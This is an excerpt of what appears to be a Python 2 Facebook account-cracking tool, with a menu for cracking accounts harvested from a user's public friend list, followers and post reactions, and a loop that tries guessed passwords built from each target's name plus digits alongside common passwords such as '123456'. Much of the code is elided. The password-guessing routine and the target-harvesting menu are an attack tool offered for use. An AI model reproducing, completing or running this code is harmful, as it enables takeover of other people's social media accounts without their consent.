...
def logo():
	os.system("clear")
	print("  \033[0;91m╔═══╦═╗╔═╦══╗╔═══╗\n ║╔═╗║║╚╝║║╔╗║║╔══╝  ║╚═╝║╔╗╔╗║╚╝╚╣╚══╗\n \033[0;91m ║╔╗╔╣║║║║║╔═╗║╔══╝ \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m ║║║╚╣║║║║║╚═╝║║ \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m ╚╝╚═╩╝╚╝╚╩═══╩╝\033[0;93mRC\033[0;97m : ME")
def bot_komen():
    try:
...
def menu():
	...
	logo()
        print(" "+O+"[#] --------------------------------------------")
	print(" \033[0;97m[\033[0;92m+\033[0;97m] Nama : "+N+"%s"%(nama))
	print(" \033[0;97m[\033[0;93m+\033[0;97m] ID   : "+N+id)
	print(" \033[0;97m[\033[0;92m+\033[0;97m] User : "+N+user)
        print(" "+O+"[#] --------------------------------------------")
        print(" \033[0;97m[\033[0;93m+\033[0;97m] IP    : "+N+ip)
        print(" \033[0;97m[\033[0;92m+\033[0;97m] Joined: "+N+durasi)
	print(" \033[0;97m[\033[0;92m+\033[0;97m] User: "+N+"Premium")
	print(" \033[0;97m[\033[0;93m+\033[0;97m] Exp: "+N+"25-09-2021")
	print(" "+O+"[#] --------------------------------------------")
	print
	print("      "+p+"[  "+H+"Welcome User "+p+"]")
	print
	print("  "+O+"[#]--------------------------------------------") 
	print(" \033[0;97m[\033[0;93m1\033[0;97m] "+N+"Crack From Public FriendList")
	print(" \033[0;97m[\033[0;92m2\033[0;97m] "+N+"Crack From Follower")
	print(" \033[0;97m[\033[0;92m3\033[0;97m] "+N+"Crack From Reaction")
	print(" \033[0;97m[\033[0;92m4\033[0;97m] "+N+"Check Result")
	print(" \033[0;97m[\033[0;92m5\033[0;97m] "+N+"Setting UserAgent")
	print(" \033[0;97m[\033[0;91m0\033[0;97m] "+N+"Logout (delete token)")
	print("  "+O+"[#]--------------------------------------------") 
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
	if ask =="":
		menu()
...
def public():
	...
	try:
		...
		print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : \033[1;92m"+sp["name"])
	except KeyError:
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),'1qwerty','123456','12345678']:
...
### SETTING USER AGENT
def settingua():
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Do you want to change the User Agent[\033[0;91m?\033[0;91m] [Y/t] : ") 
	if ask =="":
		menu()
	elif ask == "y" or ask == "Y":
		try:
			print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type in chrome search : My User Agent")
			ua = raw_input(" \033[0;97m[\033[0;96m+\033[0;97m] Your User Agent : ") 
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
